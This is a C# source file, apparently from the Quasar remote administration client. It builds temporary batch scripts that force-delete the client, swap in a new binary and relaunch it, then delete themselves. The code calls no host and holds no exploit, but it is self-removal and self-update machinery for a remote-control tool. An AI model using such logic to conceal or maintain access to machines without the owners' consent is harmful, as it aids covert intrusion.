using Quasar.Common.Helpers;
using System.IO;
using System.Text;

namespace Quasar.Client.IO
{
    /// <summary>
    /// Provides methods to create batch files for application update, uninstall and restart operations.
    /// </summary>
    public static class BatchFile
    {
        /// <summary>
        /// Creates the uninstall batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
        public static string CreateUninstallBatch(string currentFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            string uninstallBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
            return batchFile;
        }

        /// <summary>
        /// Creates the update batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <param name="newFilePath">The new file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns an empty string on failure.</returns>
        public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            string updateBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
            return batchFile;
        }

        /// <summary>
        /// Creates the restart batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
        public static string CreateRestartBatch(string currentFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            string restartBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));

            return batchFile;
        }
    }
}
